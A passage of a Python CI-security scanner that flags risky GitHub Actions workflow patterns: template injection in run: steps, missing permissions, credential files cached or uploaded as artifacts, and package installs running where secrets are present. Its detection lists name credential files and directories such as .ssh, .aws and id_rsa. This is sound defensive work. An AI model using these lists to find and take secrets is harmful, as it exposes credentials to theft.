                idx = text.find(snippet, search_cursor)
                if idx < 0:
                    # The match exists in the parsed scalar but not
                    # verbatim in the raw file. This happens with YAML
                    # folded scalars (``run: >``), where PyYAML
                    # collapses linebreaks into spaces, so a snippet
                    # spanning a fold becomes unfindable. Safe for
                    # today's P14.10 sub-patterns — each is a single-
                    # line ``${{ ... }}`` expression that survives
                    # folding identically — but a future multi-token
                    # pattern would be dropped here. Warn (not debug) so
                    # the drop is visible at the default log level and
                    # explicitly say the match is NOT reported, matching
                    # how the recursion-cap surfaces its coverage limit.
                    logger.warning(
                        "yaml-run-injection: snippet %r matched the parsed "
                        "run: scalar but not the raw file text (likely a "
                        "folded scalar) in %s — this match is NOT reported; "
                        "verify the step manually",
                        snippet,
                        file_path,
                    )
                    _record_dropped_match(
                        file_path,
                        f"a template expression ({snippet}) matched inside a "
                        "run: step but could not be located in the raw file "
                        "(folded scalar) — it is NOT reported; review the step "
                        "manually",
                    )
                    continue
                search_cursor = idx + 1
                line_no = text[:idx].count("\n") + 1
                lidx = line_no - 1
                start = max(0, lidx - 1)
                stop = min(len(lines), lidx + 2)
                evidence = "\n".join(
                    f"{i + 1:>4}: {lines[i]}"
                    f"{' <-- here' if i == lidx else ''}"
                    for i in range(start, stop)
                )
                yield RawHit(line=line_no, evidence=evidence, match_text=snippet)


def detect_yaml_path_absent(
    file_path: Path, yaml_path: str
) -> Iterator[RawHit]:
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return
    parts = [p for p in yaml_path.split(".") if p]
    matches = list(_walk_yaml_path(doc, parts))
    # `permissions: null` (or the bare `permissions:` spelling) parses
    # to None — GitHub Actions treats that identically to omitting the
    # key, so we must fire. An empty mapping (`permissions: {}`) is
    # the hardened state and must NOT fire. Distinguish by treating
    # all-None resolution as absent.
    if any(m is not None for m in matches):
        return
    yield RawHit(
        line=1,
        evidence=f"(missing) {yaml_path}",
        match_text=yaml_path,
        derived=True,
    )


def affected_jobs_for(file_path: Path) -> list[str]:
    """Return sorted job names from a workflow file.

    Returns an empty list on any of three failure modes (unreadable,
    unparseable, malformed) — each logged separately so a parse error
    doesn't masquerade as "this workflow has no jobs".
    """
    text = _read_text_safe(file_path)
    if not text:
        return []
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return []
    if not isinstance(doc, dict):
        logger.debug("Workflow %s did not parse to a mapping", file_path)
        return []
    jobs = doc.get("jobs")
    if jobs is None:
        return []
    if not isinstance(jobs, dict):
        logger.debug("Workflow %s has non-mapping jobs:", file_path)
        return []
    return sorted(str(k) for k in jobs.keys())


def job_line_ranges(file_path: Path) -> list[tuple[str, int, int]] | None:
    """``(job_name, first_line, last_line)`` for every job, in file order.

    ``yaml.safe_load`` throws line numbers away, so this composes the document
    into its node tree — which carries source marks — and reads the marks off
    the ``jobs:`` mapping. A node's end mark usually points at the first token
    of the NEXT job, so each range is clipped to the line before the following
    job starts; otherwise adjacent jobs would overlap and a line could be
    attributed to two of them. The LAST job is clipped at the end of the
    ``jobs:`` node itself, so a workflow-level key written after ``jobs:``
    (``defaults:``, a trailing ``permissions:``) is not swallowed into it.

    Three return values, not two:

    - a list of ranges → attribution worked (``[]`` legitimately means "this
      workflow declares no jobs").
    - ``None`` → the ranges could not be COMPUTED (the document would not
      compose, or its root/``jobs:`` node is not a mapping). Callers must
      render that as an unknown, not as "this line is workflow-scope" — those
      look identical downstream and one of them is a false claim.
    """
    text = _read_text_safe(file_path)
    if not text:
        return None
    try:
        root = yaml.compose(text)
    except yaml.YAMLError:
        return None
    if not isinstance(root, yaml.MappingNode):
        return None
    for key, value in root.value:
        if getattr(key, "value", None) != "jobs":
            continue
        if not isinstance(value, yaml.MappingNode):
            return None
        # The `jobs:` node's own end mark. PyYAML points it at the first token
        # AFTER the mapping, which is either a workflow-level key (so the
        # jobs block really ended the line before) or plain EOF (so that line
        # is still the last job's). Column-0 content is the tell: workflow-
        # level keys are unindented, job bodies never are.
        jobs_end = value.end_mark.line + 1
        _lines = text.splitlines()
        if 1 <= jobs_end <= len(_lines) and _lines[jobs_end - 1][:1].strip():
            jobs_end -= 1
        raw = [
            (str(jk.value), jk.start_mark.line + 1, jv.end_mark.line + 1)
            for jk, jv in value.value
            if hasattr(jk, "value")
        ]
        raw.sort(key=lambda r: r[1])
        clipped: list[tuple[str, int, int]] = []
        for i, (name, start, end) in enumerate(raw):
            if i + 1 < len(raw):
                end = min(end, raw[i + 1][1] - 1)
            else:
                end = min(end, jobs_end)
            clipped.append((name, start, max(start, end)))
        return clipped
    return []


def job_at_line(
    ranges: list[tuple[str, int, int]] | None, line: int
) -> str | None:
    """The job containing ``line``, or None when the line sits outside every
    job (workflow-level keys such as ``on:`` or a workflow-scope
    ``permissions:``) — those findings keep the whole file's job list.

    ``ranges is None`` (attribution uncomputable) also yields None, but the
    caller is expected to have branched on that first: the two Nones mean
    different things and only one of them means "workflow-scope"."""
    for name, start, end in ranges or []:
        if start <= line <= end:
            return name
    return None


def _is_workflow_call_only(file_path: Path) -> bool:
    """True when this workflow's ONLY trigger is ``workflow_call``.

    Such a file is a reusable workflow: it never starts a run of its own, and
    GitHub attributes every run it takes part in to the CALLING workflow. Its
    own ``/actions/workflows/<file>/runs`` endpoint therefore answers 200 with
    ``total_count: 0`` even when the file executes on every pull request — see
    ``fetch_workflow_activity``.
    """
    text = _read_text_safe(file_path)
    if not text:
        return False
    doc = _parse_yaml_text(text, file_path, quiet=True)
    if not isinstance(doc, dict):
        return False
    return set(_on_trigger_names(_get_on_node(doc))) == {"workflow_call"}


def fetch_workflow_activity(
    repo: str, workflow_basename: str, workflow_call_only: bool = False,
) -> dict[str, Any]:
    """Fetch recent-run activity for a workflow via gh CLI.

    On success returns ``{"runs_30d", "last_run", "dormant"}``. On any
    failure returns ``{"status": "unavailable", "reason": ...}`` — NOT an
    empty dict. The distinction matters: ``{}`` means "not enriched" (no
    ``--repo``), whereas an enrichment that was *attempted and failed* must
    not be silently read as "active". A finding whose activity check failed
    would otherwise look identical to an active one (the dormancy flag just
    goes missing), so report.py renders the unavailable state distinctly
    instead of defaulting it to active. Each failure also logs a warning.

    ``workflow_call_only`` marks a REUSABLE workflow (its `on:` declares
    nothing but `workflow_call`). GitHub attributes a reusable workflow's runs
    to the caller, so this endpoint returns 200 with an EMPTY run list for a
    file that executes on every pull request. Reading that as "dormant" was
    wrong in the way that matters: vercel/next.js's `pr_stack_optimizer.yml`
    and microsoft/playwright's `tests_docker.yml` both run constantly, and both
    carried a "verify before prioritizing" note on live HIGH findings — and,
    worse, a dormant group is dropped from the report's `all` fix selection, so
    next.js's only HIGH was silently skipped. Zero REGISTERED runs on a
    reusable workflow is UNKNOWN activity, which is what the `unavailable`
    state already means. A reusable workflow that DOES have registered runs
    keeps its real numbers.
    """
    logger.debug("fetching activity for %s/%s", repo, workflow_basename)
    try:
        from gh_utils import GitHubAPIError, run_gh_api  # noqa: E402
    except ImportError as e:
        logger.warning(
            "gh_utils unavailable; skipping activity enrichment: %s", e
        )
        return {"status": "unavailable", "reason": "gh_utils unavailable"}

    endpoint = (
        f"repos/{repo}/actions/workflows/{workflow_basename}/runs"
        f"?per_page={ACTIVITY_RUN_LIMIT}"
    )
    try:
        raw = run_gh_api(endpoint, quiet_not_found=True)
    except GitHubAPIError as e:
        # A 404 here is expected, not a failure: the scanner walks every
        # `.github/workflows/*.yml`, but GitHub only tracks run history for
        # files it registers as runnable workflows. A composite-action
        # `action.yml`, or a workflow never registered on the default branch,
        # returns 404 from the runs endpoint — there is simply no activity to
        # enrich. Log that at DEBUG; reserve WARNING for genuine failures
        # (auth, rate limit, network). Either way activity is reported as
        # unavailable, never silently assumed active.
        is_not_found = "HTTP 404" in str(e) or "Not Found" in str(e)
        (logger.debug if is_not_found else logger.warning)(
            "gh API %s for %s/%s activity: %s",
            "404 — no tracked workflow runs" if is_not_found else "failed",
            repo, workflow_basename, e,
        )
        return {"status": "unavailable", "reason": f"gh API error: {e}"}

    try:
        body = json.loads(raw)
    except json.JSONDecodeError as e:
        logger.warning(
            "gh returned non-JSON for %s/%s activity: %s",
            repo,
            workflow_basename,
            e,
        )
        return {"status": "unavailable", "reason": "gh returned non-JSON"}

    runs = body.get("workflow_runs") or []
    if workflow_call_only and not runs:
        # Not dormant — unknown. See the docstring: GitHub books a reusable
        # workflow's runs against the caller, so an empty list here is an
        # artefact of run attribution, not evidence that the file is idle.
        logger.debug(
            "%s/%s is `workflow_call`-only with no registered runs — activity "
            "unknown (runs are attributed to the calling workflow)",
            repo, workflow_basename,
        )
        return {
            "status": "unavailable",
            "reusable_workflow": True,
            "reason": (
                "reusable workflow (`on: workflow_call` only) — GitHub "
                "attributes its runs to the calling workflow, so its own run "
                "history is empty whether or not it executes"
            ),
        }
    now = _dt.datetime.now(_dt.timezone.utc)
    cutoff_30d = now - _dt.timedelta(days=30)
    cutoff_dormant = now - _dt.timedelta(days=DORMANT_DAYS)

    runs_30d = 0
    last_run: str | None = None
    last_run_dt: _dt.datetime | None = None
    skipped_runs = 0
    for run in runs:
        created = run.get("created_at")
        if not created:
            skipped_runs += 1
            continue
        try:
            created_dt = _dt.datetime.fromisoformat(created.replace("Z", "+00:00"))
        except ValueError:
            skipped_runs += 1
            continue
        if last_run_dt is None or created_dt > last_run_dt:
            last_run_dt = created_dt
            last_run = created
        if created_dt >= cutoff_30d:
            runs_30d += 1

    if skipped_runs:
        logger.warning(
            "Skipped %d runs with missing/unparseable created_at for %s/%s",
            skipped_runs,
            repo,
            workflow_basename,
        )

    dormant = last_run_dt is None or last_run_dt < cutoff_dormant
    activity = {
        "runs_30d": runs_30d,
        "last_run": last_run,
        "dormant": dormant,
    }
    logger.debug(
        "  activity: %s runs, last %s",
        activity.get("runs_30d"), activity.get("last_run"),
    )
    return activity


def _git_commit_sha(root: Path) -> str | None:
    """Return the HEAD SHA of the git repo containing ``root``, or None."""
    try:
        result = subprocess.run(
            ["git", "-C", str(root), "rev-parse", "HEAD"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode == 0:
            sha = result.stdout.strip()
            return sha if sha else None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return None


def _skill_commit_sha() -> str | None:
    """Return the HEAD SHA of the git repo containing this script.

    Used to build content-addressable permalinks into the catalog so
    reports never go stale when headings or files are renamed.
    """
    return _git_commit_sha(_THIS_DIR)


def _skill_tree_dirty() -> bool:
    """True if the skill's tracked source has uncommitted changes vs HEAD.

    ``_skill_commit_sha()`` returns the committed HEAD, which silently ignores
    edits sitting in the working tree — so a report can record an older commit
    than the code that actually produced it (this exact gap once made a report
    claim a stale commit and derailed a review). Flagging a dirty tree keeps
    the recorded ``skill commit`` honest. The ``reports/`` output dir is
    excluded: the e2e harness writes generated reports into it, which is not a
    change to the code that ran.
    """
    skill_dir = _THIS_DIR.parent  # skills/ci-secure/
    try:
        result = subprocess.run(
            ["git", "-C", str(skill_dir), "status", "--porcelain", "--", "."],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            return False
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False
    for raw in result.stdout.splitlines():
        path = raw[3:].strip()  # porcelain v1: "XY <path>", relative to skill_dir
        if " -> " in path:  # rename: take the destination
            path = path.split(" -> ", 1)[1]
        path = path.strip('"')  # git quotes paths with spaces/special chars
        if not path or path.startswith("reports/"):
            continue
        return True
    return False


def _repo_tree_dirty(root: Path) -> bool:
    """True if the AUDITED checkout has uncommitted or untracked changes.

    ``commit_sha`` records HEAD, which says nothing about edits sitting in the
    working tree — so a report can present a permalink at a commit whose bytes
    are not the bytes that were scanned. report.py renders a "tree was dirty"
    caveat on the audited-commit row when this is true (the convention ci-score
    already uses). Unknown (git missing, not a checkout) reports not-dirty:
    the commit row itself already says when no commit could be resolved.
    """
    try:
        result = subprocess.run(
            ["git", "-C", str(root), "status", "--porcelain"],
            capture_output=True, text=True, timeout=10,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False
    if result.returncode != 0:
        return False
    return bool(result.stdout.strip())


def _path_matches_any_glob(rel_path: str, globs: list[str]) -> bool:
    for g in globs:
        if fnmatch.fnmatch(rel_path, g):
            return True
    return False


# =============================================================================
# yaml-job-correlated, yaml-workflow-correlated, repo-file-check
# =============================================================================
#
# Each pattern using these detector classes names a built-in
# "correlation" or "file_check" identifier in its METADATA. The
# identifier maps to a Python function below. Keeps METADATA short
# (one key) while letting the catalog opt into specific predicates
# without growing a DSL.


def _job_step_uses_prefixes(job: dict[str, Any], prefixes: tuple[str, ...]) -> list[int]:
    """Return 1-based step indices whose `uses:` starts with any prefix."""
    hits: list[int] = []
    steps = job.get("steps")
    if not isinstance(steps, list):
        return hits
    for i, step in enumerate(steps, start=1):
        if not isinstance(step, dict):
            continue
        uses = step.get("uses", "")
        if isinstance(uses, str) and any(uses.startswith(p) for p in prefixes):
            hits.append(i)
    return hits


def _job_uses_cache(job: dict[str, Any]) -> bool:
    """Return True when the job restores or writes the shared cache.

    Covers `actions/cache@*`, `actions/cache/restore@*`, `actions/cache/save@*`,
    `actions/setup-{node,python,go,java,ruby,dotnet}` with `cache:` input,
    `pnpm/action-setup`, and `gradle/actions/setup-gradle`.
    """
    if _job_step_uses_prefixes(
        job,
        ("actions/cache@", "actions/cache/", "pnpm/action-setup", "gradle/actions/setup-gradle"),
    ):
        return True
    steps = job.get("steps")
    if not isinstance(steps, list):
        return False
    for step in steps:
        if not isinstance(step, dict):
            continue
        uses = step.get("uses", "")
        if not isinstance(uses, str):
            continue
        if any(
            uses.startswith(p)
            for p in (
                "actions/setup-node@",
                "actions/setup-python@",
                "actions/setup-go@",
                "actions/setup-java@",
                "actions/setup-ruby@",
                "actions/setup-dotnet@",
            )
        ):
            with_block = step.get("with") or {}
            if isinstance(with_block, dict) and with_block.get("cache"):
                return True
    return False


def _walk_jobs(doc: Any) -> Iterator[tuple[str, dict[str, Any]]]:
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return
    for job_name, job in jobs.items():
        if isinstance(job, dict):
            yield str(job_name), job


def _job_line_in_text(text: str, job_name: str) -> int:
    """Best-effort line number for `<job_name>:` under the top-level `jobs:`.

    The indent class is `[ \\t]`, NOT `\\s`. Under `re.MULTILINE`, `\\s` matches
    a newline, so `^\\s+` could start at a BLANK line and run through the line
    break into the next line's indentation — and `m.start()` then reported the
    blank line above the job key. On cal.com's `pr.yml` that landed the
    reported line inside the PRECEDING job's block, so a P14.19 finding cited
    `jobs.trust-check` at line 160 while its own evidence named `jobs.prepare`.
    A horizontal-only indent class cannot cross a line boundary, so the match
    always starts on the job key's own line.
    """
    pattern = re.compile(rf"^[ \t]+{re.escape(job_name)}\s*:", re.MULTILINE)
    m = pattern.search(text)
    if not m:
        return 1
    return text.count("\n", 0, m.start()) + 1


_CREDENTIAL_DIR_COMPONENTS = {
    ".aws", ".ssh", ".kube", ".docker", ".gnupg", ".azure", ".gcloud",
}
_CREDENTIAL_BASENAMES = {
    ".npmrc", ".netrc", ".pypirc", "credentials", "credentials.json", ".env",
}
_CREDENTIAL_BASENAME_GLOBS = (
    "*.pem", "*.key", "id_rsa", "id_rsa*", "id_ed25519", "id_ed25519*",
    "service-account*.json", "*.p12", "*.pfx",
)
_CACHE_UPLOAD_PREFIXES = (
    "actions/cache@", "actions/cache/save@", "actions/cache/restore@",
    "actions/upload-artifact@", "actions/upload-pages-artifact@",
)


def _path_is_credential_bearing(path_line: str) -> bool:
    p = path_line.strip().strip('"').strip("'")
    if not p:
        return False
    components = [c for c in re.split(r"[\\/]+", p) if c not in ("", "~", ".")]
    if not components:
        return False
    if any(c.lower() in _CREDENTIAL_DIR_COMPONENTS for c in components):
        return True
    base = components[-1].lower()
    if base in _CREDENTIAL_BASENAMES:
        return True
    return any(fnmatch.fnmatch(base, g) for g in _CREDENTIAL_BASENAME_GLOBS)


def _correlation_credential_file_in_cache_or_artifact(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.19 — a cache or upload step's `path:` matches a known credential
    file/dir, exfiltrating it to cache-restorers / artifact-downloaders."""
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    for job_name, job in _walk_jobs(doc):
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if not isinstance(uses, str) or not any(
                uses.startswith(p) for p in _CACHE_UPLOAD_PREFIXES
            ):
                continue
            with_block = step.get("with") or {}
            if not isinstance(with_block, dict):
                continue
            raw_path = with_block.get("path")
            if not isinstance(raw_path, str):
                continue
            hit_line = next(
                (
                    pl.strip() for pl in raw_path.splitlines()
                    if _path_is_credential_bearing(pl)
                ),
                None,
            )
            if hit_line is not None:
                line = _job_line_in_text(text, job_name)
                yield RawHit(
                    line=line,
                    evidence=(
                        f"{line:>4}: jobs.{job_name} caches/uploads "
                        f"credential-bearing path `{hit_line}` <-- here"
                    ),
                    match_text=hit_line,
                    derived=True,
                )



# --- P14.25: install scripts executed in a job that holds a live payoff -------
#
# Conditioned like the other chain detectors, NOT like a hygiene check: an
# install command on its own is every repo's CI and flagging it would be noise.
# The finding is the PAIRING — dependency lifecycle scripts executing where the
# credentials are.

# `npm ci`, `npm install`, `npm i`, `pnpm install`, `pnpm i`, `yarn install`,
# and a bare `yarn` (Yarn Classic installs when called with no command). Bounded
# on both sides so `mynpm install` or `yarn build` never match.
#
# The bare-Yarn arm accepts OPTIONS after `yarn`, because that is how it is
# actually written in CI — `yarn --frozen-lockfile`, `yarn --production`,
# `yarn --cwd packages/app`, `yarn --network-timeout 600000` are all installs,
# and an arm that only accepted a bare `yarn` at end-of-command silently
# passed over every one of them. An option's separate VALUE is consumed with
# it (`--cwd subdir`), quoted or not (`--cwd "packages/app with spaces"`),
# which is what stops the match dying on the space.
# A trailing SUBCOMMAND still ends the match — `yarn build` and
# `yarn --cwd subdir build` are not installs, because after the options the
# arm requires end-of-command, not another word — and the leading negative
# lookahead drops the informational invocations (`yarn -v`, `yarn -V`,
# `yarn --version`, `yarn --help`), which run no lifecycle scripts.
#
# EVERY arm is additionally anchored in COMMAND POSITION — the manager name has
# to be the word the shell would actually execute, never a word sitting inside
# an argument. The old left boundary was a `(?<![\w./-])` lookbehind, which
# excludes `mynpm` but says nothing about `,` or `=`, so vitejs/vite's
# `pnpm dlx pkg-pr-new@0.0 publish … --packageManager=pnpm,npm,yarn
# --commentWithDev` matched the bare-Yarn arm on the `yarn` in that
# comma-separated flag VALUE. It matched as `yarn --commentWithDev`, the job's
# manager was read as Yarn, and the cascade from there was total: the repo's
# real pnpm `allowBuilds` mitigation no longer applied (manager mismatch), a
# Yarn advisory rendered on a repo with no Yarn in it, and the fix prompt
# prescribed destructive Yarn edits to a release workflow. `,` and `=` are only
# two of the characters that can precede a word inside an argument, so the fix
# is positional rather than another blacklist: a command starts at the start of
# the string/line or right after `;`, `&`, `|`, or `(` — nowhere else.
# The one non-shell opener that still puts a command in command position: this
# matcher is run over RAW workflow lines as well as over parsed scalars, and on
# a one-line step (`- run: npm ci`) the shell starts right after the `run:` key.
_RUN_KEY_PREFIX = r"""[ \t]*(?:-[ \t]+)?["']?run["']?[ \t]*:[ \t]*"""
# `)` closes a `case` arm's pattern (`a) npm ci ;;`) and a subshell; `{` opens a
# brace group, which shell requires be followed by whitespace (`{ npm ci; }`) —
# demanding that space is also what keeps brace EXPANSION (`{npm,pnpm}`) out.
_CMD_START = (
    r"(?:^(?:" + _RUN_KEY_PREFIX + r")?[ \t]*"
    r"|(?<=[\n;&|()])[ \t]*"
    r"|(?<=\{)[ \t]+)"
)
# …with the words that can legally precede a command WITHOUT being it: shell
# keywords, the usual command-modifier wrappers, and leading `VAR=value`
# assignments. Without this allowance `sudo npm ci`, `env CI=1 pnpm install`
# and `; then yarn install` would each become a silent false negative, which is
# the worse failure for this detector (see `_INSTALL_VALUE_FLAGS`).
#
# The list is deliberately CLOSED, and is spelled as data rather than inlined
# into the regex so that closedness is ASSERTABLE. Written as a bare
# alternation nothing pinned it: `echo` could be added and the whole suite
# still passed, because the negative cases all put their install several words
# from the head. `test_the_command_wrapper_list_is_closed` pins this exact set.
#
# Membership rule: a word belongs here only if it is a TRANSPARENT process
# wrapper — it execs the following command in the SAME shell environment, with
# the same filesystem and the same secrets. That is the property P14.25's
# payoff leg rests on, and it is why `docker exec` / `docker run` are absent:
# the install runs in a container, not in the job that holds the secrets.
_CMD_WRAPPERS = (
    # shell keywords and the negation operator
    "!", "if", "while", "until", "then", "else", "do",
    # transparent command modifiers / process wrappers
    "sudo", "command", "time", "nice", "ionice", "exec", "env",
    "xvfb-run", "nohup", "setsid", "stdbuf", "timeout", "retry",
)
_CMD_PREFIX = (
    r"(?:"
    r"(?:" + "|".join(re.escape(w) for w in _CMD_WRAPPERS) + r")"
    # A wrapper option may carry its own VALUE (`sudo -u root`, `nice -n 10`).
    # The value is optional and cannot start with `-`, so `sudo -E npm ci`
    # backtracks out of it rather than eating the manager.
    r"(?:[ \t]+-{1,2}[\w-]*(?:[ \t]+[^-\s;&|][^\s;&|]*)?)*"
    # …and a bare NUMERIC argument, for the wrappers whose first operand is a
    # duration or a count: `timeout 60 npm ci`, `retry 3 pnpm install`.
    r"(?:[ \t]+\d[\w.]*)?[ \t]+"
    r"|(?:export[ \t]+)?[A-Za-z_][A-Za-z0-9_]*="
    r"(?:\"[^\"]*\"|'[^']*'|[^\s;&|]*)[ \t]+"
    r")*"
)
_INSTALL_CMD_RE = re.compile(
    _CMD_START + _CMD_PREFIX +
    r"(?<![\w./-])(?P<cmd>"
    r"npm\s+(?:ci|install|i)(?![\w-])"
    r"|pnpm\s+(?:install|i)(?![\w-])"
    r"|yarn\s+install(?![\w-])"
    r"|yarn(?!\s+-{0,2}(?:version|help|[vV]|h)(?![\w-]))"
    r"(?:\s+-[\w-]+(?:[= ](?:\"[^\"]*\"|'[^']*'|[^\s;&|]+))?)*\s*(?:$|[\n;&|])"
    r")",
    re.MULTILINE,
)
_IGNORE_SCRIPTS_RE = re.compile(r"--ignore-scripts(?![\w-])")

# --- what makes an install a DEPENDENCY-TREE install --------------------------
#
# The catalog's anti-pattern is a compromised package *in the dependency tree*
# executing its lifecycle script during a bulk install. Two command shapes match
# the regex above without being that:
#
#   npm i -g corepack@0.31          # global tool bootstrap — no project tree
#   npm install @playwright/test    # one named package, chosen by the author
#
# A global install resolves nothing from the repo's lockfile; a named install
# installs exactly what the workflow author typed. Neither is "whatever the tree
# resolves to today". Both are EXCLUDED — not silently widened into a different
# finding: a named single-package install whose own lifecycle script is
# malicious is a real but DIFFERENT shape (it needs the package's identity and
# a registry check, not a tree argument), and this detector does not claim it.
# vercel/next.js alone reported seventeen `npm i -g corepack@0.31` bootstraps
# and playwright four more named installs before this gate existed.
_GLOBAL_FLAGS = {"-g", "--global"}
# Options that consume the NEXT token as their value. Without this list
# `pnpm install --filter foo` would read `foo` as a package spec and the real
# tree install would be dropped — a false negative worse than the noise.
_INSTALL_VALUE_FLAGS = {
    "-C", "--cwd", "--dir", "--prefix", "--filter", "-F", "--filter-prod",
    "--registry", "--network-timeout", "--network-concurrency",
    "--cache-folder", "--modules-folder", "--mutex", "--store-dir",
    "--modules-dir", "--lockfile-dir", "--virtual-store-dir", "--reporter",
    "--loglevel", "--config", "--userconfig", "--cache", "--workspace",
    "--use-yarnrc", "--resolution-mode", "--package-import-method",
    "--node-linker", "--public-hoist-pattern", "--omit", "--include",
}
# Options that take NO value. This list exists so the UNKNOWN case can default
# the safe way round: an option we have never heard of is assumed to consume
# its value, because the alternative leaves that value sitting as a bare
# positional, `_PKG_SPEC_RE` reads it as a package name, and the whole
# tree-install finding vanishes SILENTLY (no `dropped_matches`, no coverage
# gap). Ten such shapes were proven — `npm ci --maxsockets 3`,
# `pnpm install --fetch-timeout 60000`, `npm ci --before 2024-01-01` — each an
# un-reported privileged install. The failure mode of a closed value-flag list
# is "an option nobody thought of", and it grows with every package-manager
# release; the failure mode of this default is one extra finding on a named
# install written with an unfamiliar boolean flag. This file's own rule (see
# `_INSTALL_VALUE_FLAGS`) is that the false negative is the worse one.
_INSTALL_BOOLEAN_FLAGS = {
    # npm
    "--save", "-S", "--save-dev", "-D", "--save-prod", "-P", "--save-optional",
    "-O", "--save-exact", "-E", "--save-peer", "--no-save", "--production",
    "--legacy-peer-deps", "--force", "-f", "--ignore-scripts", "--no-audit",
    "--no-fund", "--dry-run", "--global-style", "--package-lock-only",
    "--prefer-offline", "--prefer-online", "--offline", "--audit", "--fund",
    "--strict-peer-deps", "--install-links", "--foreground-scripts",
    "--verbose", "--silent", "--quiet", "--json", "--long", "--parseable",
    "--no-package-lock", "--no-bin-links",
    # pnpm
    "--frozen-lockfile", "--no-frozen-lockfile", "--prod", "--dev",
    "--shamefully-hoist", "--lockfile-only", "--fix-lockfile", "--recursive",
    "-r", "-w", "--workspace-root", "--no-optional", "--ignore-workspace",
    "--strict-peer-dependencies", "--no-strict-peer-dependencies",
    "--side-effects-cache", "--no-verify-store-integrity",
    # yarn
    "--immutable", "--frozen-lockfile", "--ignore-optional",
    "--ignore-engines", "--check-files", "--non-interactive", "--pure-lockfile",
    "--no-lockfile", "--immutable-cache", "--inline-builds", "--ignore-platform",
}
# A positional argument shaped like something you can install: a bare or scoped
# package name with an optional version/tag, or a URL/git/file/github specifier.
_PKG_SPEC_RE = re.compile(
    r"^(?:(?:git\+|https?://|file:|link:|github:|npm:|workspace:).+"
    r"|(?:@[A-Za-z0-9._-]+/)?[A-Za-z0-9._-]+(?:@[^\s]+)?)$"
)
_INSTALL_SUBCOMMANDS = {"install", "i", "ci"}


def _install_manager(command: str) -> str | None:
    """Which package manager the install command in `command` invokes."""
    m = _INSTALL_CMD_RE.search(command)
    if m is None:
        return None
    # `cmd`, not `group(0)`: the match now opens with the command-position
    # anchor and any `sudo` / `VAR=value` prefix, and reading the manager off
    # that prefix would name the wrong tool.
    head = m.group("cmd").lstrip()
    for name in ("npm", "pnpm", "yarn"):
        if head.startswith(name):
            return name
    return None      # pragma: no cover - the regex has only three arms


def _is_dependency_tree_install(segment: str) -> bool:
    """Is the install matched in `segment` a DEPENDENCY-TREE install?

    False for a global install (`-g` / `--global`) and for one that names an
    explicit package spec — see the block comment above. True for the bare
    tree installs the catalog is about: `npm ci`, `npm install`,
    `pnpm install --frozen-lockfile`, `yarn install`, `yarn --cwd packages/app`.
    """
    m = _INSTALL_CMD_RE.search(segment)
    if m is None:
        return False
    # Slice at the COMMAND, not at the whole match: the match now includes the
    # command-position anchor and any prefix, and `tokens[0]` must be the
    # package manager for the flag walk below to line up.
    tail = segment[m.start("cmd"):]
    try:
        tokens = shlex.split(tail, comments=False)
    except ValueError:
        # Unbalanced quotes across a fragment boundary — fall back to a plain
        # split rather than dropping the command entirely.
        tokens = tail.split()
    if not tokens:
        return False
    tokens = tokens[1:]                                   # the manager itself
    subcommand = None
    if tokens and tokens[0] in _INSTALL_SUBCOMMANDS:
        subcommand = tokens[0]
        tokens = tokens[1:]                               # ci / install / i
    # Two shapes where a POSITIONAL cannot mean "one named package", so the
    # named-install exclusion must not fire on it:
    #   `npm ci foo`   — `ci` installs the whole lockfile whatever follows it;
    #   `pnpm install ${{ inputs.args }}` — the arguments are not knowable at
    #                    scan time, and guessing them into an exclusion is a
    #                    silent drop. Only an explicit `-g` still excludes.
    positionals_can_exclude = subcommand != "ci" and "${{" not in tail
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok in _GLOBAL_FLAGS:
            return False
        if tok.startswith("-"):
            if "=" in tok or tok in _INSTALL_BOOLEAN_FLAGS:
                i += 1
                continue
            # Known value-taking, or unknown — either way assume it consumes
            # the next token, unless that token is itself an option. See
            # `_INSTALL_BOOLEAN_FLAGS` for why unknown defaults this way.
            if i + 1 < len(tokens) and not tokens[i + 1].startswith("-"):
                i += 2
                continue
            i += 1
            continue
        if positionals_can_exclude and _PKG_SPEC_RE.match(tok):
            return False
        i += 1
    return True
# `secrets.NAME` in any of the job's own text. github.token is excluded: it is
# present in every job by construction, so treating it as a payoff would make
# the payoff leg vacuous — the catalog says "beyond github.token".
_SECRET_REF_RE = re.compile(r"secrets\.([A-Za-z_][A-Za-z0-9_-]*)")
_GITHUB_TOKEN_NAMES = {"github_token", "githubtoken"}


def _job_secret_refs(job: Any, doc: Any = None) -> list[str]:
    """Secret names in this job's ENVIRONMENT, excluding a bare GITHUB_TOKEN.

    Scans the job's serialized YAML text rather than specific keys: a secret
    reaches the install step's environment from `env:` at job or step scope,
    from a step's `with:`, or from inside a `run:` scalar, and enumerating
    those keys individually is how a payoff gets missed.

    Workflow-level `env:` counts too, and this is why `doc` is a parameter.
    GitHub merges the workflow's `env:` map into EVERY job's environment, so a
    `NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` declared at the top of the file is
    just as present in the install step's process as one declared on the job —
    but the job's own subtree does not contain it, so the payoff leg read it as
    absent. facebook/react's `compiler_prereleases.yml` declares exactly that
    and its publish job was left unflagged. This mirrors how
    `_job_effective_write_scopes` already consults the workflow-level
    `permissions:` block. (`env:` MERGES, unlike `permissions:`, which
    replaces — so both scopes are read here, not one or the other.)
    """
    if not isinstance(job, dict):
        return []
    scopes: list[Any] = [job]
    if isinstance(doc, dict) and doc.get("env") is not None:
        scopes.append({"env": doc.get("env")})
    blob_parts: list[str] = []
    for scope in scopes:
        try:
            blob_parts.append(
                yaml.safe_dump(scope, default_flow_style=False, sort_keys=False)
            )
        except yaml.YAMLError:      # pragma: no cover - defensive
            blob_parts.append(str(scope))
    blob = "\n".join(blob_parts)
    names = []
